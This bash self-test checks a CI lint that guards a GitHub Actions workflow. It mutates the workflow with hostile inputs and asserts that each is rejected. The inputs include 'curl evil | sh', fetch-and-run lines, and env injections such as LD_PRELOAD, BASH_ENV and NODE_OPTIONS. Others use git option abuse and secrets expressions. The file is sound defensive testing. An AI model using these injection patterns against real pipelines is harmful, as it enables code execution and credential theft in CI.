#!/usr/bin/env bash
# shellcheck disable=SC2016
# Prove gate-integrity-lint.sh accepts the real workflow and rejects each way to run head code.
# Every case edits the real workflow by literal text replacement and asserts the lint's message.
set -euo pipefail

root="$(cd "$(dirname "$0")/../.." && pwd)"
lint="$root/scripts/ci/gate-integrity-lint.sh"
real="$root/.github/workflows/gate-integrity.yml"
tmp="$(mktemp -d)"
trap 'rm -rf "$tmp"' EXIT

"$lint" "$real" >/dev/null || { echo "FAIL: the real workflow was rejected" >&2; exit 1; }
echo "ok: real workflow -> exit 0"

run_case() {
  local name="$1" pattern="$2" rc=0
  "$lint" "$tmp/w.yml" >"$tmp/out.log" 2>&1 || rc=$?
  if [ "$rc" -eq 0 ]; then echo "FAIL: $name was accepted" >&2; exit 1; fi
  if ! grep -qF -- "$pattern" "$tmp/out.log"; then
    echo "FAIL: $name was rejected for another reason (wanted: $pattern):" >&2
    cat "$tmp/out.log" >&2
    exit 1
  fi
  echo "ok: $name -> exit $rc"
}

# case_ NAME OLD NEW MESSAGE: replace the literal OLD in the real workflow with NEW.
case_() {
  python3 -I - "$real" "$tmp/w.yml" "$2" "$3" <<'PY'
import sys
src, dst, old, new = sys.argv[1:5]
text = open(src, encoding="utf-8").read()
if old not in text:
    sys.exit(f"FAIL: {old!r} is not in the real workflow")
open(dst, "w", encoding="utf-8", newline="").write(text.replace(old, new, 1))
PY
  run_case "$1" "$4"
}

# raw_ NAME MESSAGE: the case file is already at $tmp/w.yml (written by the caller).
raw_() { run_case "$1" "$2"; }

SIZE='run: scripts/ci/pr-size.sh "$BASE_SHA" "$HEAD_REF" 800'
FETCH='run: git fetch --no-tags origin "+refs/pull/${PR_NUMBER}/head:refs/remotes/pr/head"'
CHECKOUT='      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1'
PERSIST='          persist-credentials: false'
ENVLINE='      PR_NUMBER: ${{ github.event.pull_request.number }}'
REF='          ref: ${{ github.event.pull_request.base.sha }}'
NL=$'\n'
STEP="$NL      - "
KEY="$NL        "
ENVK="$NL      "
RUN_MSG='run body is not on the allowlist'
EXPR_MSG='expression is not on the base-only allowlist: '
ENV_MSG='env key is not on the allowlist: '
USES_MSG='uses is not on the SHA-pinned allowlist'

# Spelling tricks that hide a key from a text scan parse to the same key here.
case_ "run with a space before the colon" "$FETCH" 'run : git fetch https://evil/x && bash ./head.sh' "$RUN_MSG"
case_ "run block with a space before the colon" "$SIZE" "run : |$KEY  curl evil | sh" "$RUN_MSG"
case_ "run block scalar with a trailing newline" "$SIZE" "run: |$KEY  scripts/ci/pr-size.sh \"\$BASE_SHA\" \"\$HEAD_REF\" 800" "$RUN_MSG"
case_ "second action with a space before the colon" "$PERSIST" "$PERSIST$STEP"'uses : evil/action@v1' "$USES_MSG"
case_ "shell with a space before the colon" "$SIZE" "$SIZE${KEY}shell : bash {0}" 'shell: would change how run lines execute'
case_ "shell override" "$SIZE" "$SIZE${KEY}shell: python {0}" 'shell: would change how run lines execute'
case_ "defaults with a space before the colon" 'permissions: {}' $'permissions: {}\ndefaults :\n  run:\n    shell: bash' 'defaults: would change'
case_ "defaults block" 'permissions: {}' $'permissions: {}\ndefaults:\n  run:\n    shell: bash' 'defaults: would change'
case_ "container" "    runs-on: ubuntu-24.04" $'    runs-on: ubuntu-24.04\n    container: evil/image' 'container: would change'
case_ "services" "    runs-on: ubuntu-24.04" $'    runs-on: ubuntu-24.04\n    services:\n      x:\n        image: evil' 'services: would change'
case_ "PATH with a space before the colon" "$ENVLINE" "$ENVLINE${ENVK}PATH : /x" "${ENV_MSG}PATH"
case_ "GIT_EXTERNAL_DIFF with a space before the colon" "$ENVLINE" "$ENVLINE${ENVK}GIT_EXTERNAL_DIFF : /x" "${ENV_MSG}GIT_EXTERNAL_DIFF"
case_ "PATH after a tab" "$ENVLINE" "$ENVLINE${ENVK}PATH"$'\t'": /x" "cannot parse the workflow"
case_ "PATH as an explicit key" "$ENVLINE" "$ENVLINE${ENVK}? PATH" "${ENV_MSG}PATH"
case_ "PATH in env" "$ENVLINE" "$ENVLINE${ENVK}PATH: /tmp/evil" "${ENV_MSG}PATH"
case_ "GIT_EXTERNAL_DIFF in env" "$ENVLINE" "$ENVLINE${ENVK}GIT_EXTERNAL_DIFF: ./head/x" "${ENV_MSG}GIT_EXTERNAL_DIFF"
case_ "BASH_ENV in env" "$ENVLINE" "$ENVLINE${ENVK}BASH_ENV: ./head/x" "${ENV_MSG}BASH_ENV"
case_ "LD_PRELOAD in env" "$ENVLINE" "$ENVLINE${ENVK}LD_PRELOAD: ./head/x.so" "${ENV_MSG}LD_PRELOAD"
case_ "NODE_OPTIONS in env" "$ENVLINE" "$ENVLINE${ENVK}NODE_OPTIONS: --require ./head/x" "${ENV_MSG}NODE_OPTIONS"
case_ "HEAD_REF repointed" 'HEAD_REF: refs/remotes/pr/head' 'HEAD_REF: ./head' 'env HEAD_REF must be'

# Parser-level refusals.
case_ "quoted uses key" "$PERSIST" "$PERSIST$STEP"'"uses": ./head-action' "$USES_MSG"
case_ "single-quoted uses key" "$PERSIST" "$PERSIST$STEP""'uses': ./head-action" "$USES_MSG"
case_ "escaped uses key" "$PERSIST" "$PERSIST$STEP"'"\u0075ses": ./head-action' "$USES_MSG"
case_ "flow mapping step" "$PERSIST" "$PERSIST$STEP"'{ uses: ./head-action }' "$USES_MSG"
case_ "duplicate run key" "$SIZE" "$SIZE${KEY}run: curl evil | sh" 'duplicate key: run'
case_ "duplicate key spelled with quotes" "$SIZE" "$SIZE${KEY}\"run\": curl evil | sh" 'duplicate key: run'
case_ "yaml anchor" 'persist-credentials: false' 'persist-credentials: &nocreds false' 'anchors are not allowed'
case_ "yaml alias" 'persist-credentials: false' 'persist-credentials: *nocreds' 'aliases are not allowed'
case_ "yaml tag" 'persist-credentials: false' 'persist-credentials: !!bool false' 'explicit tags are not allowed'
case_ "merge key" "$ENVLINE" "$ENVLINE${ENVK}<<: {PATH: /x}" 'merge keys (<<) are not allowed'
case_ "complex key" "$ENVLINE" "$ENVLINE${ENVK}? [PATH, x]${ENVK}: /x" 'complex (non-scalar) mapping keys are not allowed'
case_ "second yaml document" 'permissions: {}' $'permissions: {}\n---\nname: second' 'multi-document YAML is not allowed'
case_ "unparsable yaml" "$ENVLINE" "$ENVLINE${ENVK}: : :" 'cannot parse the workflow'
printf 'name: \xff\xfe\n' >"$tmp/w.yml"
raw_ "invalid utf-8" 'cannot check the workflow: UnicodeDecodeError'
: >"$tmp/w.yml"
raw_ "empty file" 'exactly one document is required'

# Allowlist schema.
case_ "extra top-level key" 'permissions: {}' $'permissions: {}\nenv:\n  A: b' 'top level: key is not on the allowlist: env'
case_ "extra job key" "    runs-on: ubuntu-24.04" $'    runs-on: ubuntu-24.04\n    needs: x' 'job: key is not on the allowlist: needs'
case_ "second job" 'jobs:' $'jobs:\n  other:\n    runs-on: ubuntu-24.04\n    steps: []' 'jobs: the only job must be gate-integrity'
case_ "extra trigger" 'on:' $'on:\n  pull_request:' 'trigger: the only trigger must be exactly'
case_ "trigger types widened" 'types: [opened, synchronize, reopened]' 'types: [opened, labeled]' 'trigger: the only trigger must be exactly'
case_ "top-level permissions widened" 'permissions: {}' 'permissions: write-all' 'top level: permissions must be {}'
case_ "job permissions widened" 'contents: read' 'contents: write' 'job: permissions must be'
case_ "other runner" 'runs-on: ubuntu-24.04' 'runs-on: self-hosted' 'job: runs-on must be'
case_ "step key outside the allowlist" "$SIZE" "$SIZE${KEY}continue-on-error: true" 'step key is not on the allowlist: continue-on-error'
case_ "working-directory" "$SIZE" "$SIZE${KEY}working-directory: head" 'step key is not on the allowlist: working-directory'
case_ "step env" "$SIZE" "$SIZE${KEY}env:${KEY}  PATH: /x" 'step key is not on the allowlist: env'
case_ "step with neither uses nor run" "$PERSIST" "$PERSIST${STEP}name: nothing" 'a step needs exactly one of uses and run'
case_ "step with both uses and run" "$SIZE" "$SIZE${KEY}uses: $(sed -n 's/^.*uses: \([^ ]*\).*/\1/p' "$real" | head -1)" 'a step needs exactly one of uses and run'
case_ "first step is not the checkout" "$CHECKOUT" "      - run: scripts/ci/pr-size.sh \"\$BASE_SHA\" \"\$HEAD_REF\" 800$NL      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1" 'the first step must be the base checkout'
case_ "second action" "$PERSIST" "$PERSIST$STEP"'uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97' "$USES_MSG"
case_ "unpinned checkout" 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1' 'actions/checkout@v7' "$USES_MSG"
case_ "local action" "$PERSIST" "$PERSIST${STEP}uses: ./head-action" "$USES_MSG"
case_ "checkout of the head" "$REF" '          ref: ${{ github.event.pull_request.head.sha }}' "${EXPR_MSG}"'${{ github.event.pull_request.head.sha }}'
case_ "checkout into a path" '          fetch-depth: 0' $'          fetch-depth: 0\n          path: head' 'with: must be exactly'
case_ "checkout of another repository" '          fetch-depth: 0' $'          fetch-depth: 0\n          repository: evil/x' 'with: must be exactly'
case_ "persisted credentials" 'persist-credentials: false' 'persist-credentials: true' 'with: must be exactly'
case_ "persisted credentials as a string" 'persist-credentials: false' 'persist-credentials: "false"' 'with: must be exactly'
case_ "fetch-depth as false" 'fetch-depth: 0' 'fetch-depth: false' 'with: must be exactly'
case_ "with on a run step" "$SIZE" "$SIZE${KEY}with:${KEY}  x: y" 'with: is only allowed on an allowlisted action'
case_ "if widened" 'if: ${{ !cancelled() }}' 'if: ${{ always() }}' 'if is not on the allowlist'

# Run bodies are compared by exact string.
case_ "bash on the head ref" "$SIZE" 'run: bash head/scripts/ci/pr-size.sh a b' "$RUN_MSG"
case_ "head script path" "$SIZE" 'run: head/scripts/ci/pr-size.sh a b' "$RUN_MSG"
case_ "extra argument" "$SIZE" 'run: scripts/ci/pr-size.sh "$BASE_SHA" "$HEAD_REF" 800 --x' "$RUN_MSG"
case_ "chained command" "$SIZE" "$SIZE; bash x.sh" "$RUN_MSG"
case_ "command substitution" "$SIZE" 'run: scripts/ci/pr-size.sh "$(curl x)" "$HEAD_REF" 800' "$RUN_MSG"
case_ "git checkout" "$FETCH" 'run: git checkout refs/remotes/pr/head' "$RUN_MSG"
case_ "git show --output" "$FETCH" 'run: git show refs/remotes/pr/head:scripts/ci/pr-size.sh --output=scripts/ci/pr-size.sh' "$RUN_MSG"
case_ "git diff abbreviated --out" "$FETCH" 'run: git diff --out=scripts/ci/pr-size.sh a b' "$RUN_MSG"
case_ "git fetch --upload-pack" "$FETCH" 'run: git fetch --upload-pack=./head/x origin' "$RUN_MSG"
case_ "git log --ext-diff" "$FETCH" 'run: git log -p --ext-diff' "$RUN_MSG"
case_ "git -c" "$FETCH" 'run: git -c core.pager=./x log' "$RUN_MSG"

# Expressions, checked on every parsed scalar.
HEADREF='${{ github.event.pull_request.head.ref }}'
case_ "expression in run" "$SIZE" "run: scripts/ci/pr-size.sh $HEADREF" "${EXPR_MSG}$HEADREF"
case_ "head ref in env" "$ENVLINE" "$ENVLINE${ENVK}HEAD_BRANCH: $HEADREF" "${EXPR_MSG}$HEADREF"
case_ "head sha in env" "$ENVLINE" "$ENVLINE${ENVK}HEAD_SHA: "'${{ github.event.pull_request.head.sha }}' "${EXPR_MSG}"'${{ github.event.pull_request.head.sha }}'
case_ "head ref split across lines" "$ENVLINE" "$ENVLINE${ENVK}HEAD_REF2: "'${{'"$ENVK  github.event.pull_request.head.ref }}" "${EXPR_MSG}$HEADREF"
case_ "head ref split by a folded block" "$ENVLINE" "$ENVLINE${ENVK}HEAD_REF2: >-${ENVK}  "'${{'"$ENVK  github.event.pull_request.head.ref }}" "${EXPR_MSG}$HEADREF"
case_ "head ref in a literal block" "$ENVLINE" "$ENVLINE${ENVK}HEAD_REF2: |+${ENVK}  $HEADREF" "${EXPR_MSG}$HEADREF"
case_ "head ref after a doubled dollar" "$ENVLINE" "$ENVLINE${ENVK}HEAD_REF2: "'$'"$HEADREF" "${EXPR_MSG}$HEADREF"
case_ "unterminated expression" "$ENVLINE" "$ENVLINE${ENVK}HEAD_REF2: "'${{ github.event.pull_request.head.ref' "${EXPR_MSG}"'${{ github.event.pull_request.head.ref'
case_ "indirect env expression" "$ENVLINE" "$ENVLINE${ENVK}X: "'${{ env.HEAD_REF }}' "${EXPR_MSG}"'${{ env.HEAD_REF }}'
case_ "secrets expression" "$ENVLINE" "$ENVLINE${ENVK}X: "'${{ secrets.TOKEN }}' "${EXPR_MSG}"'${{ secrets.TOKEN }}'
case_ "allowed prefix" "$ENVLINE" "$ENVLINE${ENVK}X: "'${{ github.event.pull_request.number.x }}' "${EXPR_MSG}"'${{ github.event.pull_request.number.x }}'
case_ "allowed expression followed by a head expression" "$ENVLINE" "$ENVLINE${ENVK}X: "'${{ github.event.pull_request.number }}${{ github.event.pull_request.head.ref }}' "${EXPR_MSG}$HEADREF"
echo "gate-integrity-lint self-test ok"
